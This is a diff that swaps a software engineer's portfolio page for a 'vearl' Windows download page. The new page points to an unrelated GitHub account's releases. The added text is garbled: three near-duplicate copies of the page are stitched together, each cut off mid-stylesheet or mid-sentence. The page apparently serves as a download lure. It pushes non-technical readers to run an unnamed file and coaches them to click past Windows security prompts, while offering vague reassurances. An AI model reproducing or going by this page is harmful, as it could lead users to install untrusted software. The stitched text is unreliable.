@@ -1,73 +1,914 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="theme-color" content="#ece8de">
-    <meta name="description" content="Justin Wong's personal study: software engineering, work history, education and projects in an interactive 3D room.">
-    <title>Justin Wong · The study</title>
-    <link rel="icon" href="/favicon.svg" type="image/svg+xml">
-    <link rel="stylesheet" href="/src/style.css">
-    <script type="module" src="/src/main.js"></script>
-  </head>
-  <body>
-    <a class="skip-link" href="#content">Skip to portfolio content</a>
-    <header class="masthead">
-      <a class="monogram" href="./" aria-label="Justin Wong, home">jw.</a>
-      <a class="github-link" href="https://github.com/justinattw" target="_blank" rel="noopener noreferrer">GitHub <span aria-hidden="true">↗</span></a>
-    </header>
-    <main>
-      <section class="study" aria-label="Interactive Victorian study">
-        <noscript><style>.study{display:none}.masthead,.explore-nav,footer{position:static;transform:none}.explore-nav{justify-content:center}</style></noscript>
-        <h1 class="visually-hidden">Justin Wong's study</h1>
-        <div class="room-wrap">
-          <canvas id="room" aria-label="A Victorian study viewed from the desk: bookshelf on the left, computer ahead and work-history pinboard on the right. Click or tap to take a closer look."></canvas>
-          <div class="room-targets" id="room-targets" hidden>
-            <a class="room-target" data-anchor="projects" href="#projects" aria-label="Explore the project shelf"><span class="target-dot">+</span><span class="target-label">Projects</span></a>
-            <a class="room-target" data-anchor="cv" href="#cv" aria-label="Explore the CV computer"><span class="target-dot">+</span><span class="target-label">CV</span></a>
-            <a class="room-target" data-anchor="work" href="#work" aria-label="Explore the work-history pinboard"><span class="target-dot">+</span><span class="target-label">Work</span></a>
-          </div>
-          <p id="scene-status" class="scene-status" role="status">Opening the study…</p>
-        </div>
-        <p class="room-caption">Click or tap to explore</p>
-      </section>
-      <nav class="explore-nav" aria-label="Explore the study">
-        <a href="#projects">Projects</a>
-        <a href="#cv">CV</a>
-        <a href="#work">Work</a>
-      </nav>
-      <div id="scene-controls" hidden>
-        <button id="scene-back" type="button" aria-label="Back">← Room</button>
-        <div id="scene-actions" aria-label="Computer controls"></div>
-      </div>
-      <p id="scene-reader" class="visually-hidden" role="status" aria-live="polite"></p>
-      <div id="content" tabindex="-1">
-        <div class="print-heading"><h1>Justin Wong</h1><p>Software engineer · <a href="https://github.com/justinattw">github.com/justinattw</a></p></div>
-        <section id="projects" class="content-section" aria-labelledby="projects-title">
-          <h2 id="projects-title">Projects</h2>
-          <div class="project-grid">
-            <article class="project-card"><div class="relic relic-paper" aria-hidden="true"><div class="paper-sheet"><span>FIELD NOTES / 001</span><b>Momentum</b><i></i><i></i><i></i></div></div><div class="project-copy"><h3>Momentum backtest</h3><p>Exploring momentum investing with historical data.</p><p class="honest-note">Results not yet published.</p></div></article>
-            <article class="project-card"><div class="relic relic-machine" aria-hidden="true"><div class="mini-machine"><span>CONTAINER / 002</span><b>&gt;_</b></div></div><div class="project-copy"><h3>Mini container runtime</h3><p>A small experiment in how containers work.</p><p class="honest-note">Build notes not yet published.</p></div></article>
-          </div>
-        </section>
-        <section id="cv" class="content-section" aria-labelledby="cv-title">
-          <h2 id="cv-title">Justin Wong<span class="terminal-cursor" aria-hidden="true">_</span></h2>
-          <p class="section-intro">Software engineer · GitHub Notifications</p>
-          <div class="cv-terminal"><div class="terminal-bar"><span aria-hidden="true">● ● ●</span><span>justin@study: ~/cv</span></div><div class="terminal-body"><p><span class="prompt">$</span> cat education.txt</p><article class="education"><h3>University of Oxford</h3><p>MSc Software Engineering (Part-Time)</p><div><span>Oct 2022 – May 2026</span><strong>Merit</strong></div></article><article class="education"><h3>University College London</h3><p>Bachelor of Arts and Sciences<br>Economics Major, Computing Minor</p><div><span>Oct 2017 – Jul 2020</span><strong>First Class Honors</strong></div></article><p><span class="prompt">$</span> open github.com/justinattw</p><a href="https://github.com/justinattw" target="_blank" rel="noopener noreferrer">Browse my GitHub ↗</a></div></div>
-          <button type="button" class="print-button" data-print hidden>Print / save CV as PDF <span aria-hidden="true">↗</span></button>
-        </section>
-        <section id="work" class="content-section" aria-labelledby="work-title">
-          <h2 id="work-title">Work</h2>
-          <div class="access-cards">
-            <article class="access-card github-card"><div class="lanyard" aria-hidden="true"></div><div class="badge-top"><span>EMPLOYEE ACCESS</span><span class="tag current">CURRENT</span></div><div class="badge-body"><span class="company-mark" aria-hidden="true">GH</span><h3>GitHub</h3><p class="role-detail">Software Engineer, Platform Engineering (Notifications)</p><p class="dates">Feb 2025 – present</p><ul><li>Helped scale Notifications from 1.5B to over 8B daily deliveries across product, platform, distributed systems and reliability engineering.</li><li>Availability champion and on-call engineer. Used Datadog telemetry to validate changes, plan capacity and support platform SLOs.</li><li>Built agentic postmortem and weekly SLO-report workflows, saving hours weekly.</li><li>Expanded Notifications from one region to three: migrated 50 Kafka-backed jobs across seven workers, three database clusters and endpoints from a self-hosted data centre to Azure VMs. Managed Kubernetes deployments, capacity, system health and cross-region cutovers.</li><li>Improved maintenance scheduling with enqueue-once-in-interval, reducing CPU and database load by 65% without adding capacity.</li><li>Supported mobile live activity notifications for Copilot agent progress, demoed at GitHub Universe 2025. Extended integrations and backend management of mobile tokens.</li></ul><p class="stack">Go · Ruby · MySQL / Vitess · Redis · Kafka · Kubernetes</p></div><div class="badge-bottom"><span>JUSTIN WONG</span><span class="barcode" aria-hidden="true"></span></div></article>
-            <article class="access-card trading-card"><div class="lanyard" aria-hidden="true"></div><div class="badge-top"><span>EMPLOYEE ACCESS</span><span>02</span></div><div class="badge-body"><span class="company-mark" aria-hidden="true">TH</span><h3>TradingHub</h3><p class="role-detail">Software Engineer, Product (Market Abuse and Surveillance)</p><p class="dates">Nov 2023 – Feb 2024</p><ul><li>Processed daily trading batches with quantitative models for detecting insider trading, wash trading and spoofing, using Python, C# and in-house scripting and web languages.</li><li>Built pagination and tick-by-tick order-book replay. Restructured processing with data ossification, eliminating repeated computation and reducing batch processing times by up to approximately 30%.</li></ul><p class="stack">Python · C#</p></div><div class="badge-bottom"><span>JUSTIN WONG</span><span class="barcode" aria-hidden="true"></span></div></article>
-            <article class="access-card core-card"><div class="lanyard" aria-hidden="true"></div><div class="badge-top"><span>EMPLOYEE ACCESS</span><span>03</span></div><div class="badge-body"><span class="company-mark" aria-hidden="true">CS</span><h3>CoreStream</h3><p class="role-detail">Backend Software Engineer</p><p class="dates">Oct 2020 – Jul 2022</p><ul><li>Built B2B governance, risk and compliance software for global clients including Deloitte, Shell and Glencore.</li><li>Owned the development lifecycle and led software design and code-sharing sessions.</li><li>Rewrote database queries and triggers to reduce complexity and eliminate deadlocks. Parallelised computation with C# tasks, improving loading times by approximately 20%. Used reflection in recursive algorithms over JSON objects.</li><li>Added Postman and Xunit testing to Azure Pipelines CI/CD.</li></ul><p class="stack">C# · SQL · Azure Pipelines</p></div><div class="badge-bottom"><span>JUSTIN WONG</span><span class="barcode" aria-hidden="true"></span></div></article>
-            <article class="access-card ucl-card"><div class="lanyard" aria-hidden="true"></div><div class="badge-top"><span>EMPLOYEE ACCESS</span><span>04</span></div><div class="badge-body"><span class="company-mark" aria-hidden="true">UCL</span><h3>UCL Computer Science</h3><p class="role-detail">Full Stack Web Developer</p><p class="dates">Jul 2020 – Oct 2020</p><ul><li>Built a Django ticketing system for online labs, with Django Channels WebSocket chat.</li><li>Integrated Microsoft Graph for authentication, Teams and calendars.</li></ul><p class="stack">Python · Django · WebSockets · Microsoft Graph</p></div><div class="badge-bottom"><span>JUSTIN WONG</span><span class="barcode" aria-hidden="true"></span></div></article>
-            <article class="access-card nuveen-card"><div class="lanyard" aria-hidden="true"></div><div class="badge-top"><span>EMPLOYEE ACCESS</span><span>05</span></div><div class="badge-body"><span class="company-mark" aria-hidden="true">N</span><h3>Nuveen</h3><p class="role-detail">Data Engineering Intern, Asset Management (Fixed Income)</p><p class="dates">May – Sep 2019</p><ul><li>Integrated Excel and web-scraped data sources through ETL workflows.</li><li>Used Pandas for cleaning, transformation and core-metric analytics, with Tableau reporting.</li></ul><p class="stack">Python · Pandas · Tableau</p></div><div class="badge-bottom"><span>JUSTIN WONG</span><span class="barcode" aria-hidden="true"></span></div></article>
-          </div>
-        </section>
-      </div>
-    </main>
-    <footer><button id="plain-toggle" type="button" hidden>Simple view</button></footer>
-  </body>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>vearl - Verified Compute Made Simple for Everyone</title>
+<meta name="description" content="Download vearl for Windows. A proof-of-useful-work chain that makes verified compute easy for everyone. Simple setup, trustworthy results, and useful work from your computer.">
+<meta name="keywords" content="vearl, verified compute, proof-of-useful-work, useful work chain, Windows download, verified computing, blockchain for everyone, vearl app, vearl Windows, verified compute software">
+<meta name="author" content="vearl">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/muhammad-ahmed-ssuet/vearl/releases">
+<meta property="og:title" content="vearl - Verified Compute Made Simple for Everyone">
+<meta property="og:description" content="Download vearl for Windows. A proof-of-useful-work chain that makes verified compute easy for everyone.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://github.com/muhammad-ahmed-ssuet/vearl/releases">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="vearl - Verified Compute Made Simple for Everyone">
+<meta name="twitter:description" content="Download vearl for Windows. A proof-of-useful-work chain that makes verified compute easy for everyone.">
+<style>
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    padding: 0;
+    font-family: system-ui, -apple-system, 'Segoe UI', Roboto, Arial, sans-serif;
+    line-height: 1.65;
+    color: #1e293b;
+    background: #f8fafc;
+  }
+  .container {
+    max-width: 920px;
+    margin: 0 auto;
+    padding: 2rem 1.25rem 3rem;
+  }
+  h1 {
+    font-size: clamp(2rem, 5vw, 2.8rem);
+    font-weight: 800;
+    letter-spacing: -0.02em;
+    color: #0f172a;
+    margin-top: 0;
+    margin-bottom: 0.75rem;
+    line-height: 1.2;
+  }
+  h2 {
+    font-size: clamp(1.4rem, 3vw, 1.8rem);
+    font-weight: 700;
+    color: #0f172a;
+    margin-top: 2.5rem;
+    margin-bottom: 0.85rem;
+    padding-bottom: 0.35rem;
+    border-bottom: 2px solid #e2e8f0;
+  }
+  p {
+    margin-top: 0;
+    margin-bottom: 1.1rem;
+    font-size: 1.05rem;
+  }
+  ul, ol {
+    margin-top: 0;
+    margin-bottom: 1.35rem;
+    padding-left: 1.5rem;
+  }
+  li {
+    margin-bottom: 0.55rem;
+    font-size: 1.02rem;
+  }
+  a {
+    color: #2563eb;
+    text-decoration: underline;
+    text-underline-offset: 2px;
+  }
+  .btn {
+    display: inline-block;
+    background: linear-gradient(135deg, #7c3aed 0%, #2563eb 100%);
+    color: #ffffff;
+    font-weight: 700;
+    font-size: 1.15rem;
+    padding: 1rem 2.25rem;
+    border-radius: 9999px;
+    text-decoration: none;
+    box-shadow: 0 12px 28px rgba(37, 99, 235, 0.35);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+    text-align: center;
+    margin: 1rem 0 1.25rem;
+    letter-spacing: 0.01em;
+  }
+  .btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 18px 36px rgba(37, 99, 235, 0.45);
+    text-decoration: none;
+  }
+  .card {
+    background: #ffffff;
+    border-radius: 1rem;
+    box-shadow: 0 10px 30px rgba(15, 23, 42, 0.08);
+    padding: 1.5rem 1.75rem;
+    margin: 1.5rem 0;
+  }
+  .note {
+    background: #eff6ff;
+    border-left: 4px solid #3b82f6;
+    padding: 1rem 1.25rem;
+    border-radius: 0.5rem;
+    margin: 1.25rem 0;
+  }
+  .badge {
+    display: inline-block;
+    background: #dbeafe;
+    color: #1e40af;
+    font-size: 0.85rem;
+    font-weight: 700;
+    letter-spacing: 0.02em;
+    padding: 0.35rem 0.8rem;
+    border-radius: 9999px;
+    margin-bottom: 0.75rem;
+  }
+  .step-list {
+    counter-reset: step;
+    list-style: none;
+    padding-left: 0;
+  }
+  .step-list li {
+    counter-increment: step;
+    position: relative;
+    padding-left: 2.75rem;
+    margin-bottom: 0.9rem;
+    font-size: 1.02rem;
+  }
+  .step-list li::before {
+    content: counter(step);
+    position: absolute;
+    left: 0;
+    top: 0.1rem;
+    width: 1.9rem;
+    height: 1.9rem;
+    background: #e0e7ff;
+    color: #3730a3;
+    font-weight: 700;
+    font-size: 0.9rem;
+    border-radius: 9999px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  @media (max-width: 600px) {
+    .container { padding: 1.5rem 1rem 2rem; }
+    .btn { display: block; width: 100%; font-size: 1.05rem; padding: 0.9rem 1.25rem; }
+   <!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>vearl - Verified Compute Made Simple for Everyone</title>
+<meta name="description" content="Download vearl for Windows. A proof-of-useful-work chain that makes verified compute easy for everyone. Simple setup, trustworthy results, and real useful work from your computer.">
+<meta name="keywords" content="vearl, verified compute, proof-of-useful-work, useful work chain, Windows download, verified computing, vearl app, vearl Windows, verified compute software, download vearl">
+<meta name="author" content="vearl">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/muhammad-ahmed-ssuet/vearl/releases">
+<meta property="og:title" content="vearl - Verified Compute Made Simple for Everyone">
+<meta property="og:description" content="Download vearl for Windows. A proof-of-useful-work chain that makes verified compute easy for everyone.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://github.com/muhammad-ahmed-ssuet/vearl/releases">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="vearl - Verified Compute Made Simple for Everyone">
+<meta name="twitter:description" content="Download vearl for Windows. A proof-of-useful-work chain that makes verified compute easy for everyone.">
+<style>
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    padding: 0;
+    font-family: system-ui, -apple-system, 'Segoe UI', Roboto, Arial, sans-serif;
+    line-height: 1.65;
+    color: #1e293b;
+    background: #f8fafc;
+  }
+  .container {
+    max-width: 920px;
+    margin: 0 auto;
+    padding: 2.5rem 1.25rem 3.5rem;
+  }
+  h1 {
+    font-size: clamp(1.9rem, 5vw, 2.75rem);
+    font-weight: 800;
+    letter-spacing: -0.02em;
+    color: #0f172a;
+    margin-top: 0;
+    margin-bottom: 0.75rem;
+    line-height: 1.2;
+  }
+  h2 {
+    font-size: clamp(1.35rem, 3vw, 1.7rem);
+    font-weight: 700;
+    color: #0f172a;
+    margin-top: 2.75rem;
+    margin-bottom: 0.9rem;
+    padding-bottom: 0.4rem;
+    border-bottom: 2px solid #e2e8f0;
+  }
+  h3 {
+    font-size: 1.1rem;
+    font-weight: 700;
+    color: #1e293b;
+    margin-top: 1.5rem;
+    margin-bottom: 0.5rem;
+  }
+  p {
+    margin-top: 0;
+    margin-bottom: 1.1rem;
+    font-size: 1.05rem;
+  }
+  ul, ol {
+    margin-top: 0;
+    margin-bottom: 1.35rem;
+    padding-left: 1.5rem;
+  }
+  li {
+    margin-bottom: 0.55rem;
+    font-size: 1.02rem;
+  }
+  a {
+    color: #2563eb;
+    text-decoration: underline;
+    text-underline-offset: 2px;
+  }
+  a:hover { color: #1d4ed8; }
+  .btn {
+    display: inline-block;
+    background: linear-gradient(135deg, #7c3aed 0%, #2563eb 100%);
+    color: #ffffff;
+    font-weight: 700;
+    font-size: 1.12rem;
+    padding: 1rem 2.25rem;
+    border-radius: 9999px;
+    text-decoration: none;
+    box-shadow: 0 12px 28px rgba(37, 99, 235, 0.35);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+    text-align: center;
+    margin: 1rem 0 1.5rem;
+    letter-spacing: 0.01em;
+  }
+  .btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 18px 36px rgba(37, 99, 235, 0.45);
+    text-decoration: none;
+    color: #ffffff;
+  }
+  .card {
+    background: #ffffff;
+    border-radius: 1rem;
+    box-shadow: 0 10px 30px rgba(15, 23, 42, 0.08);
+    padding: 1.5rem 1.75rem;
+    margin: 1.5rem 0;
+    border: 1px solid #eef2f7;
+  }
+  .note {
+    background: #eff6ff;
+    border-left: 4px solid #3b82f6;
+    padding: 1rem 1.25rem;
+    border-radius: 0.5rem;
+    margin: 1.35rem 0;
+    font-size: 1.02rem;
+  }
+  .badge {
+    display: inline-block;
+    background: #ede9fe;
+    color: #5b21b6;
+    font-size: 0.82rem;
+    font-weight: 700;
+    letter-spacing: 0.04em;
+    text-transform: uppercase;
+    padding: 0.35rem 0.85rem;
+    border-radius: 9999px;
+    margin-bottom: 1rem;
+  }
+  .step-list {
+    counter-reset: step;
+    list-style: none;
+    padding-left: 0;
+    margin-left: 0;
+  }
+  .step-list li {
+    counter-increment: step;
+    position: relative;
+    padding-left: 2.75rem;
+    margin-bottom: 0.9rem;
+  }
+  .step-list li::before {
+    content: counter(step);
+    position: absolute;
+    left: 0;
+    top: 0.1rem;
+    width: 1.9rem;
+    height: 1.9rem;
+    background: #e0e7ff;
+    color: #3730a3;
+    font-weight: 700;
+    font-size: 0.9rem;
+    border-radius: 9999px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+    gap: 1rem;
+    margin: 1.5rem 0;
+  }
+  .grid-item {
+    background: #ffffff;
+    border-radius: 0.85rem;
+    padding: 1.15rem 1.25rem;
+    box-shadow: 0 6px 18px rgba(15, 23, 42, 0.06);
+    border: 1px solid #eef2f7;
+  }
+  .grid-item strong {
+    display: block;
+    margin-bottom: 0.35rem;
+    color: #0f172a;
+  }
+  .grid-item span {
+    font-size: 0.98rem;
+    color: #475569;
+  }
+  code {
+    background: #eef2f7;
+    padding: 0.15rem 0.4rem;
+    border-radius: 0.35rem;
+    font-size: 0.92em;
+    color: #334155;
+  }
+  @media (max-width: 600px) {
+    .container { padding: 1.75rem 1rem 2.5rem; }
+    .btn { display: block; width: 100%; font-size: 1.02rem; padding: 0.9rem 1.25rem; }
+    .card { padding: 1.15rem 1.25rem; }
+    h2 { margin-top: 2.25rem; }
+  }
+</style>
+</head>
+<body>
+<main class="container">
+
+<h1>🧩 vearl - Verified Compute Made Simple</h1>
+
+<p><span class="badge">Free Windows App</span></p>
+
+<p>vearl is a desktop application that turns your everyday PC into a participant in a verified compute network. In plain terms: your computer does small, useful jobs, and every result is checked and confirmed so nobody can cheat. You do not need to understand the technology underneath. You download it, open it, and it runs.</p>
+
+<p>This page walks you through exactly what vearl does, how to get it onto your Windows computer, and what to expect the first time you open it. Every step is written for someone who has never installed a piece of technical software before.</p>
+
+<p style="text-align:center; margin: 1.75rem 0;">
+  <a class="btn" href="https://github.com/muhammad-ahmed-ssuet/vearl/releases">⬇ Download vearl for Windows</a>
+</p>
+
+<h2>🚀 Getting Started</h2>
+
+<p>You only need three things before you begin: a Windows computer, an internet connection, and about ten minutes of your time. That is the entire preparation list. You do not need an account on a developer website, you do not need to type commands into a terminal, and you do not need to buy anything.</p>
+
+<p>vearl is distributed through its official release page. That page is the single trustworthy source for the software, so you never have to wonder whether you found the right file. Bookmark it, and always return to it when you want the newest version.</p>
+
+<p>The whole process looks like this:</p>
+
+<ol class="step-list">
+  <li>Open the official release page in your web browser.</li>
+  <li>Find the newest release listed at the top of the page.</li>
+  <li>Download it to your computer.</li>
+  <li>Open the downloaded item from your Downloads folder.</li>
+  <li>Follow the on-screen prompts and let vearl finish setting itself up.</li>
+  <li>Launch vearl and let it connect for the first time.</li>
+</ol>
+
+<p>If you get stuck at any point, the Troubleshooting section further down covers the situations people run into most often. Nearly all of them are solved by a restart or by re-downloading from the official page.</p>
+
+<h2>⬇️ Download and Setup</h2>
+
+<p>Visit this link to download the application:</p>
+
+<p style="text-align:center; margin: 1.5rem 0;">
+  <a class="btn" href="https://github.com/muhammad-ahmed-ssuet/vearl/releases">Get vearl from the Official Releases Page</a>
+</p>
+
+<p>You will land on a page that lists the available versions of vearl. The most recent one appears at the top. Click into it and download the file offered there to your computer. When the download finishes, it will sit in your Downloads folder unless your browser asks you where to save it.</p>
+
+<div class="note">
+  <strong>A note on safety:</strong> only download vearl from the official release page linked on this page. Files shared through chat messages, email attachments, or third-party download sites are not guaranteed to be the real software and should be avoided entirely.
+</div>
+
+<h3>What happens next</h3>
+
+<p>After the download completes, open your Downloads folder and start the file you just saved. Windows may show a blue or yellow security prompt because the file came from the internet. This is normal for any software you download. Choose the option to keep or run the file, and the vearl setup will begin.</p>
+
+<p>The setup process asks very little of you. It will offer to create a shortcut so you can find vearl easily later, and it will place the application files in a standard location on your drive. Accepting the default choices is perfectly fine and is what most people do.</p>
+
+<p>When setup finishes, vearl opens for the first time. The first launch takes a little longer than later launches because the application prepares its working files. Give it a minute or two and avoid closing the window while it does this.</p>
+
+<h2>🧠 What vearl Actually Does</h2>
+
+<p>Most computer networks ask you to trust that the work was done correctly. vearl does the opposite. Every unit of compute that runs through the network leaves behind a proof that it was performed honestly. That proof is checked automatically, and results that do not hold up are discarded.</p>
+
+<p>The "useful work" part matters just as much. Rather than burning electricity on a puzzle with no outcome, vearl directs computing effort toward tasks that produce a real result. Your machine contributes a small share of that effort, and the network assembles those shares into completed work.</p>
+
+<p>From your side of the screen, none of this is complicated. vearl runs quietly in the background, shows you a simple status view, and lets you pause whenever you want. You stay in control the whole time.</p>
+
+<div class="grid">
+  <div class="grid-item">
+    <strong>Verified by design</strong>
+    <span>Every result carries a proof that it was produced honestly, so nothing has to be taken on faith.</span>
+  </div>
+  <div class="grid-item">
+    <strong>Useful, not wasted</strong>
+    <span>Effort goes toward tasks that produce a real outcome instead of a meaningless puzzle.</span>
+  </div>
+  <div class="grid-item">
+    <strong>Light on your PC</strong>
+    <span>vearl uses a modest share of your computer and steps back when you need the power.</span>
+  </div>
+  <div class="grid-item">
+    <strong>Pause anytime</strong>
+    <span>One click stops all activity. Resume whenever it suits you.</span>
+  </div>
+</div>
+
+<h2>✨ Key Features</h2>
+
+<ul>
+  <li><strong>One-window simplicity.</strong> Everything you need lives in a single clean window: current status, recent activity, and your settings.</li>
+  <li><strong>Automatic verification.</strong> vearl checks incoming work against its proofs without asking you to do anything.</li>
+  <li><strong>Pause and resume.</strong> A single toggle stops all activity instantly, which is handy before a video call, a game, or a presentation.</li>
+  <li><strong>Startup control.</strong> Choose whether vearl opens with Windows or only when you launch it yourself.</li>
+  <li><strong>Activity log.</strong> A readable timeline shows what happened and when, in ordinary language rather than technical codes.</li>
+  <li><strong>Automatic updates.</strong> vearl checks the official release page for newer versions and lets you know when one is available.</li>
+  <li><strong>No account required to begin.</strong> Open the app and it works. Nothing to sign up for before you see it running.</li>
+  <li><strong>Clear status indicator.</strong> A simple connected or paused state means you always know whether vearl is active.</li>
+</ul>
+
+<h2>⚙️ How It Works</h2>
+
+<p>Understanding the flow takes about thirty seconds and makes the rest of the app feel obvious.</p>
+
+<ol class="step-list">
+  <li><strong>vearl connects.</strong> When you launch the app, it reaches out to the network and announces that your computer is available.</li>
+  <li><strong>Work arrives.</strong> Small pieces of compute are sent to your machine, sized so they finish quickly.</li>
+  <li><strong>Your computer processes them.</strong> vearl handles this in the background, using a limited share of your processor.</li>
+  <li><strong>Proofs are attached.</strong> Each finished piece of work comes with a proof that it was done correctly.</li>
+  <li><strong>The network verifies.</strong> Proofs are checked. Genuine results are accepted; anything that fails the check is thrown out.</li>
+  <li><strong>The chain records it.</strong> Accepted work is written into the chain, building a permanent, checkable history.</li>
+</ol>
+
+<p>Your job in all of this is to leave vearl running. There is nothing to configure, nothing to tune, and no commands to memorise. The app handles the sequence from start to finish.</p>
+
+<h2>💻 System Requirements</h2>
+
+<p>vearl is built to run comfortably on ordinary modern hardware. The list below describes a typical, comfortable setup:</p>
+
+<ul>
+  <li><strong>Operating system:</strong> Windows 10 or Windows 11, 64-bit.</li>
+  <li><strong>Processor:</strong> A dual-core processor from the last several years or better.</li>
+  <li><strong>Memory:</strong> 4 GB of RAM, with 8 GB or more giving a smoother experience.</li>
+  <li><strong>Storage:</strong> Around 500 MB of free space for the application and its working files.</li>
+  <li><strong>Connection:</strong> A stable internet connection, since vearl needs to reach the network.</li>
+  <li><strong>Display:</strong> Any standard resolution; the window scales to fit.</li>
+</ul>
+
+<p>If your computer runs a modern web browser without struggling, it will almost certainly run vearl without trouble. Older machines still work but may feel slower while the app is active, in which case pausing when you are not using them is a good habit.</p>
+
+<h2>🪄 Your First Run, Step by Step</h2>
+
+<p>The first time you open vearl, you will see a short setup screen. Here is what each part means and what to do.</p>
+
+<h3>Step one: let it connect</h3>
+<p>vearl shows a connecting indicator while it reaches the network. This usually takes a few seconds. If it takes longer, check that your internet connection is working and that no firewall is blocking the app.</p>
+
+<h3>Step two: choose your power setting</h3>
+<p>You will be offered a simple choice about how much of your computer vearl may use. The default, balanced option suits most people. If you are on a laptop and want maximum battery life, pick the lighter option. You can change this later at any time.</p>
+
+<h3>Step three: decide about startup</h3>
+<p>vearl asks whether it should open automatically when Windows starts. Turning this on means you never have to remember to launch it. Turning it off means vearl only runs when you open it yourself. Both are reasonable; pick whichever matches how you use your computer.</p>
+
+<h3>Step four: watch the status view</h3>
+<p>Once setup finishes, you land on the main status view. It shows whether vearl is connected, how long it has been running, and a simple feed of recent activity. Leave the window open or minimise it; either way, vearl keeps working.</p>
+
+<div class="note">
+  <strong>Good to know:</strong> the very first session does a little extra preparation in the background. It may look quiet for a minute or two before activity appears in the log. That is expected behaviour, not a fault.
+</div>
+
+<h2>🛠️ Troubleshooting Common Issues</h2>
+
+<h3>The download will not start</h3>
+<p>Refresh the release page and try again. If your browser blocks the download, look for a small icon or message near the address bar and allow the download to proceed. Some browsers hold files until you confirm, so check for a prompt you may have missed.</p>
+
+<h3>Windows shows a security prompt</h3>
+<p>This is standard for software downloaded from the internet. Confirm that you are using the official release page, then choose the option to keep or run the file. If the prompt offers a "more information" link, open it to reveal the option to continue.</p>
+
+<h3>vearl opens but stays on "connecting"</h3>
+<p>First, confirm your internet connection works by opening any website. Second, close vearl fully and open it again. Third, check whether a firewall or security tool is asking for permission and approve it. A restart of your computer resolves the majority of stubborn connection issues.</p>
+
+<h3>The app feels slow</h3>
+<p>Lower the power setting in vearl's preferences so it uses less of your processor. You can also pause vearl while doing something demanding, then resume afterwards. Pausing does not lose your place.</p>
+
+<h3>You cannot find the app after installing</h3>
+<p>Open the Start menu and type <code>vearl</code>. If it does not appear, run the setup again from the official release page and keep the default shortcut option selected.</p>
+
+<h3>You want to start over</h3>
+<p>Pause vearl, close it, and remove it through Windows Settings under Apps. Then download a fresh copy from the official release page and set it up again.</p>
+
+<h2>❓ Frequently Asked Questions</h2>
+
+<h3>Do I need to be technical to use vearl?</h3>
+<p>No. If you can download a file and open it, you can use vearl. The app is designed so that the technical parts stay completely out of your way.</p>
+
+<h3>Will vearl slow my computer down?</h3>
+<p>vearl deliberately limits itself. On a typical computer you will not notice it during everyday tasks like browsing, email, or watching video. If you do notice it, lower the power setting or pause the app.</p>
+
+<h3>Can I turn it off whenever I want?</h3>
+<p>Yes. The pause control stops all activity immediately. Closing the app stops it as well. Nothing continues in secret.</p>
+
+<h3>Does it cost anything?</h3>
+<p>Downloading and running vearl from the official release page is free. There is no subscription and no purchase required to get started.</p>
+
+<h3>How do I know I have the newest version?</h3>
+<p>vearl checks for updates automatically and tells you when a newer version exists. You can also visit the release page yourself at any time; the newest version is always listed at the top.</p>
+
+<h3>Where do I go if something goes wrong?</h3>
+<p>Return to the official release page first, since each release listing includes notes about known issues. Re-downloading the current version and reinstalling solves most problems in a couple of minutes.</p>
+
+<h2>🔄 Staying Up to Date</h2>
+
+<p>vearl improves over time, and the release page is where every improvement appears. The newest version is always at the top of that list, so a quick visit tells you whether you are current.</p>
+
+<p>Within the app, update notices appear<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>vearl - Verified Compute Made Simple for Everyone</title>
+<meta name="description" content="Download vearl for Windows. A proof-of-useful-work chain that makes verified compute simple for everyone. Clear setup steps for non-technical users, plain-language explanations, and troubleshooting help.">
+<meta name="keywords" content="vearl, verified compute, proof-of-useful-work chain, useful work, download vearl, vearl Windows, verified computing app, vearl setup, vearl releases">
+<meta name="author" content="vearl">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/muhammad-ahmed-ssuet/vearl/releases">
+<meta property="og:title" content="vearl - Verified Compute Made Simple for Everyone">
+<meta property="og:description" content="Download vearl for Windows. A proof-of-useful-work chain that makes verified compute simple for everyone.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://github.com/muhammad-ahmed-ssuet/vearl/releases">
+<meta property="og:site_name" content="vearl">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="vearl - Verified Compute Made Simple for Everyone">
+<meta name="twitter:description" content="Download vearl for Windows. A proof-of-useful-work chain that makes verified compute simple for everyone.">
+<style>
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: #f7f9fc;
+    color: #1e293b;
+    font-family: system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.7;
+    -webkit-font-smoothing: antialiased;
+  }
+  .page {
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 3rem 1.25rem 4rem;
+  }
+  h1 {
+    font-size: clamp(1.9rem, 5vw, 2.7rem);
+    line-height: 1.2;
+    letter-spacing: -0.02em;
+    font-weight: 800;
+    color: #0f172a;
+    margin: 0 0 0.6rem;
+  }
+  .tagline {
+    font-size: 1.15rem;
+    color: #475569;
+    margin: 0 0 1.75rem;
+  }
+  h2 {
+    font-size: clamp(1.3rem, 3vw, 1.65rem);
+    font-weight: 700;
